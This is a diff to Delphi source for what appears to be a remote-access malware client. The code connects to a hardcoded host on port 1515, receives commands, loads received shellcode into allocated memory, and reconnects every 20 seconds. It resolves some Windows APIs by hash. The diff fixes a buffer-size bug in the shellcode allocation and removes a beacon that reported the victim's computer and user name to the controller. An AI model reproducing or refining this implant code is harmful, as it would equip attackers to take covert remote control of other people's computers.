@@ -114,7 +114,7 @@ begin
   pNewShell.dwID := pShell.dwID;
   pNewShell.pReserved := nil;
   pNewShell.nextShellCode := nil;
-  pNewShell.pShellCode := pConn.pAPI.xAllocMem(pConn.pAPI, pNewShell.dwID);
+  pNewShell.pShellCode := pConn.pAPI.xAllocMem(pConn.pAPI, pNewShell.dwLen);
   if pNewShell.pShellCode <> nil then
     CopyMemory(pNewShell.pShellCode, pData, pNewShell.dwLen);
   pNewShell.nextShellCode := pConn.pShellCode;
@@ -179,32 +179,6 @@ begin
     end;
     pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
   end;
-end;
-
-function SendInformation(pConn:PConnRec):Boolean;
-var
-  pComputerName:array[0..100] of WideChar;
-  pUserName:array[0..100] of WideChar;
-  pFullInformations:PWideChar;
-  dwLen:Cardinal;
-  strCMP:Array[0..8] of WideChar;
-begin
-  Result := False;
-  strCMP[0]:='%';strCMP[1]:='s';strCMP[2]:='@';strCMP[3]:='%';strCMP[4]:='s';strCMP[5]:='|';strCMP[6]:='%';strCMP[7]:='d';strCMP[8]:=#0;
-  dwLen := 100;
-  pConn.pAPI.xZeroMemory(pComputerName, dwLen);
-  pConn.xGetComputernameW(@pComputerName[0], dwLen);
-  dwLen := 100;
-  pConn.pAPI.xZeroMemory(pUserName[0], dwLen);
-  pConn.xGetUserNameW(@pUserName[0], dwLen);
-  dwLen := (pConn.pAPI.xlstrlenW(pComputerName) + pConn.pAPI.xlstrlenW(pUsername) + 1) * 2;
-  pFullInformations := pConn.pAPI.xAllocMem(pConn.pAPI, dwLen);
-  if pFullInformations <> nil then
-  begin
-    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100);
-    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, pConn.pAPI.xlstrlenW(pFullInformations) * 2, False);
-  end;
-  pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
 end;
 
 function ConnectToHost(pConn:PConnRec; pAddress:PChar; dwPort:Integer):Integer;
@@ -288,8 +262,6 @@ begin
     Result.xconnect := pAPI.xGetProcAddress(Result.hWinsock, @strconnect[0]);
     Result.xsend := pAPI.xGetProcAddress(Result.hWinsock, @strsend[0]);
     Result.xrecv := pAPI.xGetProcAddress(Result.hWinsock, @strrecv[0]);
-    Result.xGetComputerNameW := pAPI.xGetProcAddressEx(pAPI.hKernel32, $4E5771A7, 16);
-    Result.xGetUserNameW := pAPI.xGetProcAddressEx(pAPI.hAdvapi32, $ADA2AFC2, 12);
     LoadHelpers(Result);
   end;
 end;
@@ -310,10 +282,7 @@ begin
       pConn.hWinsock := ConnectToHost(pConn, @strHost[0], 1515);
       if pConn.hWinsock <> INVALID_SOCKET then
       begin
-        if SendInformation(pConn) then
-        begin
-          ReceiveCommands(pConn);
-        end;
+        ReceiveCommands(pConn);
       end;
       CloseSocket(pConn.hWinsock);
       Sleep(20000);
